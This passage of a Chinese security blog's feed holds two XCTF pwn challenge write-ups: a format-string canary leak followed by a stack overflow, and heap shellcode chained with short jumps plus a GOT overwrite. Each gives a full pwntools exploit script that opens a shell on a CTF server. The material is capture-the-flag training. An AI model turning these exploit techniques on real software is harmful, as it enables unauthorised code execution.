34d55040075d054f95b4c4234ce906d8608365282f2d8ddc84027f4dd53bb0597020f89c16da07b13b706ec81e9601070720324ebb89730db5508b239309a5c5499aada78e5a25528ce00764e7fa985875bab24b3e921cc32b52d25611b66e6430ab5f2ada6a687e9a24205fe361a816a64150be43b154c50dc4d8a2b6ac76133cde71f81e1994f7d93d671e12dcb6681a3aa6a07706157c09058c58b136f875e7ca84bb2b0683ec21e04bf5453cfd49aad76661ff5ae21483b913f7928fa8c723e3103bd86f539d39b6cd136640e51b1dde657969d8d2e03c8b15929b64662d88d619c3a19a4cb01c9f506063fde6f7209af7f5438e12a2acd5fc94b46bb582675c7650da18e9e184fbbf3bcd67840c33d3dd102038e1ab454335e253fa395df9de4b0b853908d6006c85b419f7a2be5b1ed01a69303dd0928187cdff83f806754f86ffff4b9d9a7ed9bab2c4b328fd6555d5ed74a212d31dd646aabb3482b88100fc7e1d6cf4dfd6628618f80f911b9d36353169</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>【XCTF-Pwn:Mary_Morto】非常简单的热身pwn（ps：我还真信了）</title>
    <link href="https://muzibing.github.io/2020/07/19/2020.07.19%EF%BC%88138%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/19/2020.07.19（138）/</id>
    <published>2020-07-18T16:00:00.000Z</published>
    <updated>2020-07-25T03:07:52.975Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-相关知识点font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-相关知识点font"></a> <font color="navy"><code>0x00 相关知识点</code></font></h3><blockquote><ul><li>格式化字符串的利用</li><li>金丝雀的绕过</li><li>栈的溢出</li></ul></blockquote><h3 id="font-color-navy0x01-分析题目font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-分析题目font"></a> <font color="navy"><code>0x01 分析题目</code></font></h3><blockquote><p>既然题目说是个非常简单的热身的pwn，那我就简单的<b>热一下身</b></p></blockquote><h4 id="font-color-blue1file-maryfont"><a class="markdownIt-Anchor" href="#font-color-blue1file-maryfont"></a> <font color="blue"><code>1.file mary</code></font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file mary</span><br><span class="line">mary: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b7971b84c2309bdb896e6e39073303fc13668a38, stripped</span><br></pre></td></tr></table></figure><blockquote><p>该文件是一个64位的ELF可执行文件</p></blockquote><h4 id="font-color-blue2checksec-maryfont"><a class="markdownIt-Anchor" href="#font-color-blue2checksec-maryfont"></a> <font color="blue"><code>2.checksec mary</code></font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec mary</span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/2/Mary_Morton/mary&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><blockquote><p>可以看出开启了金丝雀保护和栈不可执行保护，因此我们可能需要对金丝雀进行绕过</p></blockquote><h4 id="font-color-blue3试运行程序font"><a class="markdownIt-Anchor" href="#font-color-blue3试运行程序font"></a> <font color="blue"><code>3.试运行程序</code></font></h4><p><img src="/images/138-1.png" alt></p><blockquote><p>从上图可以得知，该程序有两个选项：栈溢出和格式化字符串漏洞，那说明选项1可能有栈溢出的风险，选项2可能有格式化字符串漏洞的风险，这是我们试运行程序得到的信息，下面我就看看该程序的伪代码。</p></blockquote><h4 id="font-color-blue4获取程序的伪代码font"><a class="markdownIt-Anchor" href="#font-color-blue4获取程序的伪代码font"></a> <font color="blue"><code>4.获取程序的伪代码</code></font></h4><p><img src="/images/138-2.png" alt></p><blockquote><p>上图是程序选项为<code>1</code>时的伪代码，可以看出该模块是有栈溢出漏洞的危害</p></blockquote><p><img src="/images/138-3.png" alt></p><blockquote><p>上图是程序选项为<code>2</code>时的伪代码，可以看出该模块有格式化字符串漏洞</p></blockquote><h3 id="font-colornavy0x02-解题思路font"><a class="markdownIt-Anchor" href="#font-colornavy0x02-解题思路font"></a> <font color="navy"><code>0x02 解题思路</code></font></h3><p>      从上文对题目的分析以后，我们可以有一种利用思路是：</p><blockquote><ol><li>通过格式化字符串漏洞将Canary泄露出来</li><li>再通过选项1的栈溢出执行shellcode</li></ol></blockquote><p>      下面我们看看怎么写exp脚本：</p><h4 id="font-color-blue1泄露canaryfont"><a class="markdownIt-Anchor" href="#font-color-blue1泄露canaryfont"></a> <font color="blue"><code>1.泄露canary</code></font></h4><p>      通过上图可以看出，我们输入的<code>AAAAAAAA</code>，距离格式化字符串有6个位置，但是去掉前5个寄存器的位置，那么就是格式化字符串和<code>buf</code>的位置相邻，那么下面我们确定一下金丝雀的位置：</p><p><img src="/images/138-4.png" alt></p><blockquote><p>可以从上图看出，金丝雀的位置为<code>rbp-0x8</code>，因为<code>buf</code>的距离<code>rbp</code>的位置有<code>0x90</code>，所以我们可以得出<code>buf</code>距离 Canary有<code>0x88</code>，也就是<code>0x88/8=17</code>个地址单位，那么距离格式化字符串有<code>17（buf到canary的距离）+5（5个寄存器）+1（canary本身）=23</code>个单位，如下图所示：</p></blockquote><p><img src="/images/138-5.jpg" alt></p><blockquote><p>那么我们可以将格式化字符串设置为<code>%23$p</code>，下图是运行程序时输入的<code>%23$p</code>，输出结果为<code>0x2c3bceda73691600</code>，从后两位可得这是canary，那么我们就成功的把金丝雀泄露出来了。</p></blockquote><p><img src="/images/138-6.png" alt></p><h4 id="font-color-blue2栈溢出font"><a class="markdownIt-Anchor" href="#font-color-blue2栈溢出font"></a> <font color="blue"><code>2.栈溢出</code></font></h4><p><img src="/images/138-2.png" alt></p><blockquote><p>上图中的buf可以输入的空间大小有<code>0x100</code>，而buf到ebp的距离却只有<code>0x90</code>，所以说这里存在着栈溢出的漏洞，但是有因为有canary，所以利用方式如下图：</p></blockquote><p><img src="/images/138-7.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># ROPgadget --binary mary --string &quot;system&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400464 : system</span><br><span class="line"></span><br><span class="line"># ROPgadget --binary mary --string &quot;flag&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400b36 : flag</span><br></pre></td></tr></table></figure><blockquote><p>从上面的搜索结果中可以看出，该程序中里面包含“system”和“flag”的，下面我们就在IDA中搜索一下位置，看一下是否有可以直接利用的shellcode，若然还真有，如下图：</p></blockquote><p><img src="/images/138-8.png" alt></p><blockquote><p>地址为<code>0x4008DA</code>，下面我们就可以构造exp了</p></blockquote><h3 id="font-color-navy0x03-expfont"><a class="markdownIt-Anchor" href="#font-color-navy0x03-expfont"></a> <font color="navy"><code>0x03 exp</code></font></h3><p><code>选项2泄露canary，选项1进行栈溢出</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">36580</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x4008DA</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"3. Exit the battle"</span>,<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_string</span><span class="params">()</span>:</span></span><br><span class="line">payload1 = <span class="string">"%23$p"</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">canary = int(r.recvuntil(<span class="string">"\n"</span>)[:<span class="number">16</span>],<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"[*] The value of Canary is"</span>,canary)</span><br><span class="line"><span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overflow</span><span class="params">(canary)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"3. Exit the battle"</span>,<span class="string">"1"</span>)</span><br><span class="line">payload2 = (<span class="number">0x90</span><span class="number">-0x8</span>)*<span class="string">"a"</span> + str(p64(canary),encoding=<span class="string">"unicode_escape"</span>) + <span class="string">"a"</span>*<span class="number">8</span> + str(p64(system_addr),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">start()</span><br><span class="line">canary = format_string()</span><br><span class="line">overflow(canary)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-相关知识点font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-相关知识点font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="栈相关题目" scheme="https://muzibing.github.io/tags/%E6%A0%88%E7%9B%B8%E5%85%B3%E9%A2%98%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>【XCTF-Pwn:Note-service2】在堆上执行shellcode</title>
    <link href="https://muzibing.github.io/2020/07/18/2020.07.18%EF%BC%88137%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/18/2020.07.18（137）/</id>
    <published>2020-07-17T16:00:00.000Z</published>
    <updated>2020-07-19T02:55:37.613Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-基础知识font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-基础知识font"></a> <font color="navy"><code>0x00 基础知识</code></font></h3><h4 id="font-color-blue1什么是shellcodefont"><a class="markdownIt-Anchor" href="#font-color-blue1什么是shellcodefont"></a> <font color="blue"><code>1.什么是shellcode</code></font></h4><blockquote><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode<strong>机器码</strong>，让电脑可以执行攻击者的任意指令。 ——维基百科</p></blockquote><h4 id="font-color-blue2shellcode的c语言形式font"><a class="markdownIt-Anchor" href="#font-color-blue2shellcode的c语言形式font"></a> <font color="blue"><code>2.shellcode的C语言形式</code></font></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *code[<span class="number">2</span>]; </span><br><span class="line">    code[<span class="number">0</span>] = <span class="string">"/bin/sh"</span>; </span><br><span class="line">    code[<span class="number">1</span>] = <span class="literal">NULL</span>; </span><br><span class="line">    execve(code[<span class="number">0</span>], code, <span class="literal">NULL</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>再将上述代码进行简化：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    execve(<span class="string">"/bin/sh"</span>,<span class="number">0</span>, <span class="number">0</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="font-color-blue3shellcode的汇编形式font"><a class="markdownIt-Anchor" href="#font-color-blue3shellcode的汇编形式font"></a> <font color="blue"><code>3.shellcode的汇编形式</code></font></h4><blockquote><p>将上述代码进行编译，然后在反汇编，就可以看到其汇编代码，如下：（只关注main函数的）</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0000000000001135 &lt;main&gt;:</span><br><span class="line">    1135:       55                      push   %rbp</span><br><span class="line">    1136:       48 89 e5                mov    %rsp,%rbp</span><br><span class="line">    1139:       48 83 ec 10             sub    $0x10,%rsp</span><br><span class="line">    113d:       89 7d fc                mov    %edi,-0x4(%rbp)</span><br><span class="line">    1140:       48 89 75 f0             mov    %rsi,-0x10(%rbp)</span><br><span class="line">    1144:       ba 00 00 00 00          mov    $0x0,%edx</span><br><span class="line">    1149:       be 00 00 00 00          mov    $0x0,%esi</span><br><span class="line">    114e:       48 8d 3d af 0e 00 00    lea    0xeaf(%rip),%rdi        # 2004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line">    1155:       e8 d6 fe ff ff          callq  1030 &lt;execve@plt&gt;</span><br><span class="line">    115a:       b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">    115f:       c9                      leaveq </span><br><span class="line">    1160:       c3                      retq   </span><br><span class="line">    1161:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">    1168:       00 00 00 </span><br><span class="line">    116b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br></pre></td></tr></table></figure><blockquote><p>rax 保存系统调用号#59，这是execve的调用号<br>rdi  保存execve的第一个参数，是&quot;/bin/sh&quot;的地址<br>rsi  是指向前面用到的&quot;/bin/sh&quot;的指针开始并以空指针结尾的指针数组<br>rdx 是零，用来做execve的第三个参数<br>execve的原型是：<code>int execve(const char *filename, char *const argv[],char *const envp[]);</code></p></blockquote><p>      在很多题目中对输入的长度有限制，上述的shellcode就显得不起作用了，所以还需要精简shellcode，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rax,0x3b</span><br><span class="line">mov rsi,0</span><br><span class="line">mov rdx,0</span><br><span class="line">mov rdi,XXX  # rdi代表的是“/bin/sh”的地址</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><blockquote><p>这是针对64位的，但是这种字节码就要比32位下的长很多，因为0x3b只需要占8个bit，所以将rax改为eax也可以，并且还减少了字节的长度，其他命令也是如此，rdi有点特殊，大家可以想一下。</p></blockquote><h4 id="font-color-blue4jmp-命令font"><a class="markdownIt-Anchor" href="#font-color-blue4jmp-命令font"></a> <font color="blue"><code>4.jmp *** 命令</code></font></h4><blockquote></blockquote><h3 id="font-color-navy0x01-解题思路font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-解题思路font"></a> <font color="navy"><code>0x01 解题思路</code></font></h3><h4 id="font-color-blue1file-pwnfont"><a class="markdownIt-Anchor" href="#font-color-blue1file-pwnfont"></a> <font color="blue"><code>1.file pwn</code></font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># file pwn</span><br><span class="line"></span><br><span class="line">pwn: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6c3a706907441fd73514dbca2d692e7a7c9139aa, stripped</span><br></pre></td></tr></table></figure><blockquote><p>可以得到该文件是一个64位的ELF文件</p></blockquote><h4 id="font-color-blue2checksec-pwnfont"><a class="markdownIt-Anchor" href="#font-color-blue2checksec-pwnfont"></a> <font color="blue"><code>2.checksec pwn</code></font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># checksec pwn</span><br><span class="line"></span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/2/note-service2/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><blockquote><p>可以看出NX没有开启保护，并且<code>Has RWX segments</code>说明栈和堆上的代码可执行，也就是说我们可以将我们的shellcode放入栈中，然后进行执行，除此之外开启了地址无关代码，以及金丝雀保护。下面看看伪代码：</p></blockquote><p><code>addNote函数</code></p><p><img src="/images/137-1.png" alt></p><blockquote><p>从上图中可以看出，<font color="green">程序并没有对<code>qword_2020A0[v1]</code>数组的下标进行检查，</font>从而可能导致在任意地址上进行读写操作，甚至可能改变got表中的值。从上图还可以看出，我们只能申请8字节大小的堆空间，那么我们能输入的content有多大呢？下面我们就看一下<code>sub_B69((__int64)qword_2020A0[v1], v2);</code>函数，如下图：</p></blockquote><p><img src="/images/137-2.png" alt></p><blockquote><p>从上图中可以看出，我们能往chunk中输入的字符最多有7个字节，所以说我们上文所说的shellcode就无法全部输入进去，那么我们是否可以将这些shellcode分别输入到不同的chunk，然后用jmp命令将这些shellcode连接起来呢？首先我们来确定shellcode的划分：</p><ul><li>mov eax,0x3B：5字节</li><li>mov esi,0：5字节</li><li>mov edx,0：5字节</li><li>syscall：2字节</li></ul></blockquote><p>      “/bin/sh”的值可以通过程序的输入进行输入，在这里我们用<code>atoi()函数</code>，我们看一下第一次执行<code>atoi函数</code>的汇编：</p><p><img src="/images/137-3.png" alt></p><blockquote><p>通过上图可以看出，如果输入的是&quot;/bin/sh&quot;，汇编代码会自动将其地址放入rdi中，所以无需我们自己再构造指令了。</p></blockquote><h4 id="font-color-blue3确定jmp的距离font"><a class="markdownIt-Anchor" href="#font-color-blue3确定jmp的距离font"></a> <font color="blue"><code>3.确定jmp的距离</code></font></h4><p>      上面已经得到要输入的shellcode了，但是每个chunk中的shellcode怎么连接起来呢？这就需要我们的<code>jmp short</code>指令，这是一个相对近址跳转指令，我们来看看它的原理是什么，如下图：</p><p><img src="/images/137-4.png" alt></p><blockquote><p>如上图，看地址为<code>0xE94</code>和<code>0xEA0</code>处的汇编指令，都是<code>jmp short loc_ED1</code>，那么jmp是怎么跳转到的呢？下面看上图中的右半部分，可以看出地址为<code>0xE94</code>的指令的字节为：<code>EB 3B</code>，而地址<code>0xEA0</code>的指令的字节为：<code>EB 2F</code>，它们都是跳转到地址为<code>ED1</code>处，来计算一下是怎么跳转的：</p><ul><li><code>0xE94</code>：0xe94+0x3b = 0xecf，0xecf+2 = 0xed1</li><li><code>0xEA0</code>：0xea0+0x2f = 0xecf，0xecf+2 = 0xed1</li></ul><p>也就是说要得到目标地址那么就是jmp指令距离函数loc_ED1的距离2F，那么在堆中的跳转距离是多少呢？下面画一个示意图来说明一下，如下图：</p></blockquote><p><img src="/images/137-5.png" alt></p><blockquote><p>由此看来jmp short xxx中的xxx的值是<code>该命令行结束后的地址，即图中的0x1017地址，到要执行命令的起始位置，即图中的0x1030位置</code>，所以我们可以得到jmp结束后的地址到下一个chunk用户数据处的地址的距离为：<code>1+8+8+8 = 25(0x19)</code>，为什么是这样的，可以看上图的实例。</p></blockquote><h4 id="font-color-blue4确定解题思路font"><a class="markdownIt-Anchor" href="#font-color-blue4确定解题思路font"></a> <font color="blue"><code>4.确定解题思路</code></font></h4><blockquote><p>通过上述的分析，我们确定了如下的解题思路：</p><ol><li>将我们的shellcode布置在几个不同的堆块上，如下图：</li></ol><p><img src="/images/137-6.jpg" alt></p><ol start="2"><li>根据上图是可以看到，我们可以通过数组下标溢出，将atoi的got表的值改为我们申请的第一个块的地址，但是如果一开始就修改atoi的got表，那么在后面的程序运行中会出现错误，所以我们在最后修改atoi的got表地址，而且必须放在chunk的最前面，因为这样才能形成一个完整的控制流，那么我们如何操作呢？我们可以利用uaf的技巧，这是因为该程序在释放空间时没有将指针置为NULL，当我们释放了第一个chunk，然后再申请一个相同大小的chunk，进行重复利用，从而修改atoi的got表地址；其他的chunk即按照正常的顺序申请即可，申请流程如下：</li></ol><p><img src="/images/137-7.jpg" alt></p><ol start="3"><li>从上图可以看出，我们就可以写出完整的exp</li></ol></blockquote><h3 id="font-color-navy0x02-完整expfont"><a class="markdownIt-Anchor" href="#font-color-navy0x02-完整expfont"></a> <font color="navy"><code>0x02 完整exp</code></font></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">40709</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"pwn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addNote</span><span class="params">(r, index, size, content)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"your choice&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"index:"</span>,index)</span><br><span class="line">r.sendlineafter(<span class="string">"size:"</span>,size)</span><br><span class="line">r.sendafter(<span class="string">"content"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteNote</span><span class="params">(r, index)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"your choice&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"index"</span>,index)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addNote(r,<span class="string">"0"</span>,<span class="string">"8"</span>,<span class="string">"a"</span>*<span class="number">7</span>)</span><br><span class="line">addNote(r,<span class="string">"1"</span>,<span class="string">"8"</span>,asm(<span class="string">'xor rsi,rsi'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>) + <span class="string">b'\x90\x90\xeb\x19'</span>)</span><br><span class="line">addNote(r,<span class="string">"2"</span>,<span class="string">"8"</span>,asm(<span class="string">'xor rdx,rdx'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>) + <span class="string">b'\x90\x90\xeb\x19'</span>)</span><br><span class="line">addNote(r,<span class="string">"3"</span>,<span class="string">"8"</span>,str(asm(<span class="string">'syscall'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>),encoding=<span class="string">"unicode_escape"</span>).ljust(<span class="number">7</span>,<span class="string">'\x90'</span>))</span><br><span class="line">addNote(r,<span class="string">"4"</span>,<span class="string">"8"</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line">deleteNote(r,<span class="string">"0"</span>)</span><br><span class="line"><span class="comment">#addNote(r,str((elf.got["free"]-0x2020A0)//8),"8",asm('xor rax,rax',os="linux",arch="amd64") + b'\x90\x90\xeb\x19')</span></span><br><span class="line"><span class="comment">#addNote(r,"2","8",asm('mov eax,0x3B',os="linux",arch="amd64") + b'\xeb\x19')</span></span><br><span class="line">addNote(r,str((elf.got[<span class="string">"atoi"</span>]<span class="number">-0x2020A0</span>)//<span class="number">8</span>),<span class="string">"8"</span>,asm(<span class="string">'mov eax,0x3B'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>) + <span class="string">b'\xeb\x19'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>,<span class="string">'/bin/sh'</span>)  </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-基础知识font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-基础知识font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 基
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="堆相关题目" scheme="https://muzibing.github.io/tags/%E5%A0%86%E7%9B%B8%E5%85%B3%E9%A2%98%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>由浅入深的剖析堆</title>
    <link href="https://muzibing.github.io/2020/07/13/2020.07.13%EF%BC%88136%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/13/2020.07.13（136）/</id>
    <published>2020-07-12T16:00:00.000Z</published>
    <updated>2020-07-14T15:00:52.603Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>     